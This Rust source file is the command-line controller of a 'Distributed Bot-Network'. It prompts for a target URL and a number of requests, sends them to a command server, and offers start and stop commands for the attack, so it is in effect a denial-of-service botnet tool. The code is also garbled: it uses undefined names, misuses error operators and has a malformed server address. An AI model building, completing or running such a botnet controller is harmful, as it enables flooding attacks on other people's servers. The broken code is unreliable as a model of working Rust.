use std::io::{stdin, stdout, Write};
use serde_json;
use std::io;
use core::error::Error;

struct Host {
    server_address: String,
    attack_address: String,
    num_requests: i32,
}

impl Host {
    fn new(server_address: String) -> Self {
        Host {
            server_address,
            attack_address: String::new(),
            num_requests: 0,
        }
    }

    fn validate_attack_address(attack_address: &str) -> bool {
        attack_address.starts_with("http://") || attack_address.starts_with("https://")
    }

    fn validate_requests_amount(num_requests: &str) -> bool {
        num_requests.parse::<i32>().map_or(false, |n| n > 0)
    }

    fn set_attack_address(&mut self) {
        println!("Enter attack address: ");
        let mut inp = String::new();
        stdin().read_line(&mut inp)?;

        let attack_address = inp.trim();
        while !self::validate_attack_address(attack_address) {
            println!("Invalid attack address");
            println!("Enter attack address: ");
            stdout().flush().unwrap();
            inp.clear();
            stdin().read_line(&mut inp)?;
        }
        self.attack_address = attack_address.to_owned();
    }

    fn set_requests_amount(&mut self) {
        println!("Enter number of requests: ");
        let mut inp = String::new();
        stdin().read_line(&mut inp)?;

        let num_requests = inp.trim();
        while !self::validate_requests_amount(num_requests) {
            println!("Invalid number of requests");
            println!("Enter number of requests: ");
            stdout().flush().unwrap();
            inp.clear();
            stdin().read_line(&mut inp)?;
        }
        self.num_requests = num_requests.parse().unwrap();
    }

    fn send_attack_info(&self) {
        let attack_info = serde_json::json!({
            "attack_address": &self.attack_address,
            "requests_amount": self.num_requests,
        });

        let client = client::new();
        let res = client
            .post(&format!("http://{}/attack_info", self.server_address))
            .json(&attack_info)
            .send()?;
    }

    fn _receive_attack_info(&mut self) {
        // let client = Client::new();
        let res = client
            .get(&format!("http://{}/attack_info", self.server_address))
            .send()?;
    }
    fn start_attack(&mut self) {
        self.send_attack_info();
    }
}

fn set_attack_info(host_: &mut Host) {
    hoster.set_attack_address();
    hoster.set_requests_amount();
    println!("Attack info set successfully");
}

fn start_attack_wrapper(host_: &mut host::Host) {
    host_.start_attack();
    println!("Started attacking...");
}

fn stop_attack_wrapper(host_: &mut host::Host) {
    host_.stop_attack();
    println!("Stopped attacking");
}

fn print_info() {
    println!("Main commands:");
    println!("1. Type 'set' to set attack info.");
    println!("2. Type 'help' to see the list of available options.");
    println!("3. Type 'start' to start the attack.");
    println!("4. Type 'stop' to stop the attack.");
}

fn main() {
    let mut host = Host::new(String::from("http://localhost8000"));
    let server_address = ("0.0.0.0", 8000);
    let mut host_ = host::Host::new(&format!("{}:{}", server_address.0, server_address.1));

    let inp_options = vec![
        ("set", set_attack_info as fn(&mut host::Host)),
        ("help", print_info as fn()),
        ("start", start_attack_wrapper as fn(&mut host::Host)),
        ("stop", stop_attack_wrapper as fn(&mut host::Host)),
    ];

    println!("Distributed Bot-Network Command Line Interface");
    println!("Type 'help' to see the list of available options.");
    println!("Enter command:");

    loop {
        let mut inp = String::new();
        stdin().read_line(&mut inp).expect("Failed to read line");
        let inp = inp.trim();

        let inp = inp.trim();
        if inp == "exit" {
            break;
        }
        match inp_options.get(inp) {
            Some(func) => func(&mut host_),
            None => {
                println!(
                    "Unknown option. \nType 'help' to see the list of all available options."
                );
                continue;
            }
        }
    }
}

